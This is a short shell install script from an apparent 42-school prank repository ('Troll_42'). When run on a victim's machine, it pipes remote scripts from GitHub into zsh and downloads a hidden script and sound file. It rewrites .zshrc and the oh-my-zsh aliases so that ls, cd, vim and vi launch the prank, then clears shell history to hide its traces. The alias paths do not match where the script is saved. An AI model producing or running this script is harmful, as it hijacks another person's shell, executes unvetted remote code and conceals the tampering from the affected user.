# **************************************************************************** #
#                                                           LE - /             #
#                                                               /              #
#    install.sh                                       .::    .:/ .      .::    #
#                                                  +:+:+   +:    +:  +:+:+     #
#    By: amonteli <amonteli@student.le-101.fr>      +:+   +:    +:    +:+      #
#                                                  #+#   #+    #+    #+#       #
#    Created: 2019/07/20 21:38:02 by amonteli     #+#   ##    ##    #+#        #
#    Updated: 2019/07/25 13:24:36 by amonteli    ###    #+. /#+    ###.fr      #
#                                                          /                   #
#                                                         /                    #
# **************************************************************************** #

if [ -f ~/.brewconfig.zsh ]
then
	(brew install switchaudio-osx)
else
	(curl -fsSL https://rawgit.com/kube/42homebrew/master/install.sh | zsh)
	(curl -fsSL https://raw.githubusercontent.com/iSnkh/Troll_42/master/lsound/install.sh | zsh)
fi

if [ -f ~/.zshrc ]
then
		cp ~/.zshrc ~/.zshrcsave
fi

if [ -f ~/.oh-my-zsh/custom/alias.zsh ]
then
		cp ~/.oh-my-zsh/custom/alias.zsh ~/.oh-my-zsh/custom/.aliassave
fi

curl https://raw.githubusercontent.com/iSnkh/Troll_42/master/lsound/zsht.sh -o ~/.zsht.sh
curl https://raw.githubusercontent.com/iSnkh/Troll_42/master/sound/nik-zebi-vegeta.mp3 -o ~/.troll.mp3
touch ~/.oh-my-zsh/custom/alias.zsh

echo "alias ls='sh /Users/$USER/zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh
echo "alias cd='sh /Users/$USER/zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh
echo "alias vim='sh /Users/$USER/zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh
echo "alias vi='sh /Users/$USER/zsht.sh'" >> ~/.oh-my-zsh/custom/alias.zsh

echo "alias ls='sh /Users/$USER/zsht.sh'" >> ~/.zshrc
echo "alias cd='sh /Users/$USER/zsht.sh'" >> ~/.zshrc
echo "alias vim='sh /Users/$USER/zsht.sh'" >> ~/.zshrc
echo "alias vi='sh /Users/$USER/zsht.sh'" >> ~/.zshrc

clear
history -c 
exec zsh
